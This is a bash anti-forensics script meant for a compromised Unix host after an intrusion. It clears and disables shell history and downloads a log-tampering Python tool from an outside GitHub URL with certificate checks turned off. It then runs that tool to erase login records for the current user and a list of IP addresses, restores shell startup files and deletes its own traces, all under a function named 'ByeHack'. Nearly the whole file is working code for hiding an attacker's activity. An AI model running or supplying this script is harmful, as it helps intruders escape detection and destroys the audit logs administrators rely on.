history -c ;
unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG;
export HISTFILE=/dev/null;
export HISTSIZE=0;
export HISTFILESIZE=0;
REST="\e[0m"
UNDERLINE="\e[4m"
ColorBlack="\e[30m"
ColorRed="\e[31m"
ColorGreen="\e[32m"
ColorYellow="\e[33m"
ColorBlue="\e[34m"
ColorMagenta="\e[35m"


my_name="$(whoami)"

my_ips=/tmp/_asdgninvidsfasdg125125sadsaf;
index_f=/tmp/_fadsgindexfs;
clear_shell=/tmp/asdgsdgdg_log_c;

function gglog {
    echo -e "${ColorBlue}[\!]${REST} ${ColorYellow}$* ${REST}"
}
function _resume {
  for i in $(cat $index_f);
  do
    cp -v $i /var/log/  2>/dev/null;
  done
}

gglog "collection info for clear"

if [ -f ~/.bash_logout ];then
  gglog "ByeHack already ready "
fi


if [ !  -f $clear_shell ];then
    wget --no-check-certificate  -q -c -t 3 'https://raw.githubusercontent.com/re4lity/logtamper/master/logtamper.py' > $clear_shell; 
    gglog "Download logtamper ok"
fi

function CL {
    if [ -f $clear_shell ];then
	for ip_one in $(cat $my_ips);do
    	    python $clear_shell -m 2 -u $my_name -i $ip_one ;
        done
    fi
}


function ByeHack {
  mv /tmp/_bash ~/.bashrc
  if [[ "$(cat /tmp/_bash_out)" == "" ]];then
      rm ~/.bash_logout;
  else
      mv /tmp/_bash_out ~/.bash_logout;
  fi
  CL
  _resume;
  rm $my_ips;
  rm $index_f;
  rm $clear_shell;
}

ByeHack;
